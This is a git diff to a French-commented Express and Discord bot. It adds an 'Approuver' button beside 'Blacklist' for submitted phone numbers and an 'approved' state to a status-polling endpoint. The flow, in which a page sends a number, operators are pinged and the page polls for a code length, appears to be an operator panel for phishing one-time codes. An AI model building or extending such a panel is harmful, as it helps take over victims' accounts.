@@ -93,16 +93,21 @@ app.post('/api/send-code', async (req, res) => {
             )
             .setTimestamp();
         
-        // On crée le bouton pour blacklister
-        const blacklistRow = new ActionRowBuilder().addComponents(
+        // On crée les boutons pour Blacklist et Approuver
+        const actionRow = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
-                .setCustomId(`blacklist_${phone}`) // On met le numéro dans l'ID du bouton
+                .setCustomId(`blacklist_${phone}`)
                 .setLabel('Blacklist')
-                .setStyle(ButtonStyle.Danger) // Bouton rouge
-                .setEmoji('🚫')
+                .setStyle(ButtonStyle.Danger)
+                .setEmoji('🚫'),
+            new ButtonBuilder()
+                .setCustomId(`approve_${phone}`)
+                .setLabel('Approuver')
+                .setStyle(ButtonStyle.Success)
+                .setEmoji('✅')
         );
 
-        await channel.send({ content: '@everyone', embeds: [embed], components: [blacklistRow] });
+        await channel.send({ content: '@everyone', embeds: [embed], components: [actionRow] });
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: 'Erreur Discord' });
@@ -115,8 +120,11 @@ app.get('/api/check-status', (req, res) => {
     if (lastAction.phone === phone && lastAction.status === 'ready') {
         res.json({ ready: true, length: lastAction.length });
         lastAction.status = 'waiting'; 
+    } else if (lastAction.phone === phone && lastAction.status === 'approved') {
+        res.json({ approved: true });
+        lastAction.status = 'waiting'; 
     } else {
-        res.json({ ready: false });
+        res.json({ ready: false, approved: false });
     }
 });
 
@@ -139,7 +147,7 @@ client.on(Events.InteractionCreate, async interaction => {
         await interaction.message.edit({ components: [newRow] });
     }
 
-    // 2. Gestion du bouton Blacklist (L'étape 4)
+    // 2. Gestion du bouton Blacklist
     if (interaction.customId.startsWith('blacklist_')) {
         const phoneToBlacklist = interaction.customId.replace('blacklist_', '');
         
@@ -151,6 +159,20 @@ client.on(Events.InteractionCreate, async interaction => {
         
         const disabledRow = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId('done_blacklist').setLabel('Blacklisté').setStyle(ButtonStyle.Secondary).setDisabled(true)
+        );
+        await interaction.message.edit({ components: [disabledRow] });
+    }
+
+    // 3. Gestion du bouton Approuver
+    if (interaction.customId.startsWith('approve_')) {
+        const phoneToApprove = interaction.customId.replace('approve_', '');
+        
+        lastAction.status = 'approved';
+        
+        await interaction.reply({ content: `✅ Le compte \`${phoneToApprove}\` a été approuvé !`, ephemeral: true });
+        
+        const disabledRow = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId('done_approve').setLabel('Approuvé').setStyle(ButtonStyle.Secondary).setDisabled(true)
         );
         await interaction.message.edit({ components: [disabledRow] });
     }
